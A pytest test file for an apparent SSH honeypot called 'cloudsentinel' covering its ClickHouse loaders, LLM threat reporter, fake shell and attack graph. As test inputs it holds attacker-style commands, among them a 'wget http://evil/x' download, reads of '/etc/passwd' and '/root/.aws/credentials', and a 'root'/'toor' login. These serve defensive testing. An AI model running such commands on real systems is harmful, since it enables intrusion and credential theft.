"""Coverage gaps: admin loaders, reporter LLM, server execute, pipeline, VFS, commands."""

from __future__ import annotations

import asyncio
import json
import sys
import time
import types

import pytest
from pydantic import SecretStr

from cloudsentinel.admin_api import (
    _latest_mttb_from_clickhouse,
    _load_attack_distribution_from_clickhouse,
    _load_attack_graph_from_clickhouse,
    _load_truth_summary_from_clickhouse,
)
from cloudsentinel.attack_graph import AttackGraph
from cloudsentinel.config import LLMSettings, load_settings
from cloudsentinel.pipeline import EventEnvelope
from cloudsentinel.server import CloudSentinelSession
from cloudsentinel.shell import HoneyPotInteractiveProtocol
from cloudsentinel.stream import LiveStream
from cloudsentinel.vfs import VirtualFileSystem
from cloudsentinel.vfs_agent import VFSAgent, VFSContext


class _FakeResult:
    def __init__(self, rows: list) -> None:
        self.result_rows = rows


class _FakeClickHouse:
    def __init__(self, rows: list) -> None:
        self.rows = rows

    def query(self, _query: str) -> _FakeResult:
        return _FakeResult(self.rows)


def _enable_clickhouse(monkeypatch: pytest.MonkeyPatch, rows: list) -> None:
    import clickhouse_connect

    monkeypatch.setattr(clickhouse_connect, "get_client", lambda **_kwargs: _FakeClickHouse(rows))
    settings = load_settings(
        "src/cloudsentinel/configs/usas-production.yaml",
        "src/cloudsentinel/.env",
    )
    settings.clickhouse.enabled = True
    return settings


def test_admin_clickhouse_loaders(monkeypatch: pytest.MonkeyPatch) -> None:
    settings = _enable_clickhouse(monkeypatch, [[2.5]])
    assert _latest_mttb_from_clickhouse(settings) == 2.5

    settings = _enable_clickhouse(
        monkeypatch,
        [
            ("cloudsentinel.login.failed", 5),
            ("cloudsentinel.command.input", 3),
            ("cloudsentinel.session.connect", 2),
            ("cloudsentinel.http.request", 1),
        ],
    )
    assert _load_attack_distribution_from_clickhouse(settings) == {
        "Brute Force": 5,
        "Command Injection": 3,
        "Port Scanning": 2,
        "Malware Upload": 1,
    }

    settings = _enable_clickhouse(
        monkeypatch,
        [("8.8.8.8", 3, 80, ["T1105"], "a" * 32)],
    )
    graph = _load_attack_graph_from_clickhouse(settings)
    assert graph["nodes"][0]["label"] == "8.8.8.8"
    assert graph["edges"][0]["target"] == "honeypot"

    settings = _enable_clickhouse(
        monkeypatch,
        [[100, 10, 5, 2, 50, 20, 30, 10, 5, 3, 1.5, 60.0]],
    )
    summary = _load_truth_summary_from_clickhouse(settings)
    assert summary is not None
    assert summary["total_events"] == 100
    assert summary["total_connections"] == 50
    assert summary["block_rate"] == 10.0


@pytest.mark.asyncio
async def test_threat_reporter_llm_paths(monkeypatch: pytest.MonkeyPatch) -> None:
    import cloudsentinel.threat_reporter as reporter

    class FakeResponse:
        choices = [
            types.SimpleNamespace(
                message=types.SimpleNamespace(
                    content='```json\n{"summary":"sum","primary_objective":"obj","confidence":0.9}\n```'
                )
            )
        ]

    fake_litellm = types.ModuleType("litellm")

    async def fake_acompletion(**_kwargs: object) -> FakeResponse:
        return FakeResponse()

    fake_litellm.acompletion = fake_acompletion  # type: ignore[attr-defined]
    monkeypatch.setitem(sys.modules, "litellm", fake_litellm)
    parsed = await reporter._call_litellm("prompt")
    assert parsed["summary"] == "sum"
    raw = await reporter._call_litellm_raw("prompt")
    assert "sum" in raw

    class FakeRedis:
        async def lrange(self, *_args: object) -> list[str]:
            return ["whoami"]

        async def get(self, key: str) -> str:
            return "8.8.8.8" if key.endswith(":ip") else "50"

        async def smembers(self, *_args: object) -> set[str]:
            return {"T1105"}

        async def aclose(self) -> None:
            return None

    monkeypatch.setattr("redis.asyncio.from_url", lambda *_args, **_kwargs: FakeRedis())
    data = await reporter.fetch_session_data("session-1", "redis://unit")
    assert data["attacker_ip"] == "8.8.8.8"
    assert data["commands"] == ["whoami"]


def test_attack_graph_credential_and_export() -> None:
    graph = AttackGraph()
    graph.add_event(
        {
            "src_ip": "8.8.8.8",
            "session": "s1",
            "hassh_md5": "b" * 32,
            "country_code": "US",
            "cloudsentinel_risk_score": 80,
            "cloudsentinel_mitre_techniques": ["T1105"],
            "eventid": "cloudsentinel.login.failed",
            "username": "root",
            "input": "ssh root@10.0.0.5",
        }
    )
    subgraph = graph.get_subgraph("8.8.8.8", depth=2)
    assert subgraph["nodes"]
    assert graph.to_cytoscape()["elements"]
    assert graph._lateral_moves == 1


def _session_with_fake_server():
    settings = load_settings(
        "src/cloudsentinel/configs/usas-production.yaml",
        "src/cloudsentinel/.env",
    )
    settings.llm.provider = "mock"

    async def emit_event(*_args: object, **_kwargs: object) -> None:
        return None

    fake_server = type(
        "FakeServer",
        (),
        {
            "settings": settings,
            "username": "root",
            "src_ip": "8.8.8.8",
            "started_at": time.time(),
            "anomaly_detector": None,
            "_emit_event": emit_event,
            "_fuzz_detected": False,
            "_tty_logger": type("TTY", (), {"record": lambda self, _data: None})(),
        },
    )()
    return CloudSentinelSession(fake_server)


@pytest.mark.asyncio
async def test_server_execute_paths() -> None:
    session = _session_with_fake_server()
    try:
        assert await session._execute("cd /tmp") == ""
        assert session.vfs.context.cwd == "/tmp"
        unknown = await session._execute("definitely-not-a-command")
        assert "command not found" in unknown
        honeytoken = await session._execute("cat /root/.aws/credentials")
        assert honeytoken
    finally:
        await session.vfs.close()


def test_pipeline_envelope_to_row_full() -> None:
    payload = {
        "eventid": "cloudsentinel.command.input",
        "session": "full-1",
        "sensor": "unit",
        "src_ip": "8.8.8.8",
        "src_port": 1234,
        "dst_ip": "10.0.0.1",
        "dst_port": 22,
        "country_code": "US",
        "country_name": "United States",
        "city": "Test",
        "continent": "NA",
        "latitude": "1.5",
        "longitude": "2.5",
        "timezone": "UTC",
        "username": "root",
        "password": "toor",
        "auth_type": "password",
        "attempt": 2,
        "hassh_md5": "a" * 32,
        "hassh_algorithms": "kex;enc;mac;cmp",
        "kexAlgs": ["kex"],
        "encCS": ["enc"],
        "macCS": ["mac"],
        "compCS": ["cmp"],
        "version": "SSH-2.0-test",
        "key_type": "ssh-rsa",
        "input": "whoami",
        "reason": "command",
        "cloudsentinel_risk_score": 77,
        "cloudsentinel_mitre_techniques": ["T1105"],
        "cloudsentinel_soar_action": "iptables_block",
        "detected_at": 1710000000.0,
        "block_started_at": 1710000001.0,
        "block_completed_at": 1710000002.0,
        "mttb_ms": 12.5,
        "block_command": "iptables",
        "block_stdout": "ok",
        "block_stderr": "",
        "duration": "1.2",
        "timestamp": 1710000003.0,
    }
    envelope = EventEnvelope(
        event_type="cloudsentinel.command.input",
        session_id="full-1",
        src_ip="8.8.8.8",
        src_port=1234,
        timestamp=1710000003.0,
        payload=payload,
    )
    row = envelope.to_clickhouse_row()
    assert row["eventid"] == "cloudsentinel.command.input"
    assert row["username"] == "root"
    assert row["password"] == "toor"
    assert row["hassh_md5"] == "a" * 32
    assert row["cloudsentinel_risk_score"] == 77
    assert row["mttb_ms"] == 12.5
    assert row["block_command"] == "iptables"


def test_vfs_agent_helpers() -> None:
    settings = LLMSettings(provider="mock")
    agent = VFSAgent(settings, VFSContext("unit-host", "Ubuntu 22.04 LTS"))
    try:
        assert agent._is_blocked_command("docker ps") is True
        assert agent._is_templated_command("ps aux") is True
        assert agent._is_complex_or_binary("wget http://evil/x") is True
        assert agent._is_complex_or_binary("./payload") is True
        assert agent._mock_response("whoami").strip() == "root"
        assert "root:x:0:0" in agent._handle_file_read("cat /etc/passwd")
        assert agent._bounded("a\n" * 100).count("\n") <= settings.response_template_max_lines
        agent._set_cache("unit-command", "cached")
        assert agent._get_cache("unit-command") == "cached"
        assert agent._handle_local_state("cd /tmp") == ""
        assert agent._handle_local_state("export X=1") == ""
        assert agent._handle_local_state("echo x") is None
    finally:
        asyncio.run(agent.close())


def test_commands_batch() -> None:
    class Transport:
        def __init__(self) -> None:
            self.data = b""

        def write(self, data: bytes) -> None:
            self.data += data

        def close(self) -> None:
            return None

    commands = [
        "id",
        "pwd",
        "hostname",
        "date",
        "uptime",
        "ps",
        "free",
        "df",
        "cat /etc/passwd",
        "ls /etc",
        "which ls",
        "env",
    ]
    for command in commands:
        transport = Transport()
        protocol = HoneyPotInteractiveProtocol(
            transport=transport,
            vfs=VirtualFileSystem.build_default(),
            username="root",
            hostname="unit-host",
            ip="8.8.8.8",
        )
        protocol._execute_single(command.encode())
        assert transport.data, command


@pytest.mark.asyncio
async def test_stream_event_handlers() -> None:
    stream = LiveStream(host="127.0.0.1", port=0)
    await stream.start()
    try:
        handlers = stream._sio.handlers["/"]
        await handlers["connect"]("sid-1", {"HTTP_AUTHORIZATION": "", "QUERY_STRING": ""})
        assert "sid-1" in stream._auth_clients
        await handlers["subscribe"]("sid-1", {"types": ["unit"]})
        await handlers["disconnect"]("sid-1")
        assert "sid-1" not in stream._auth_clients
    finally:
        await stream.stop()
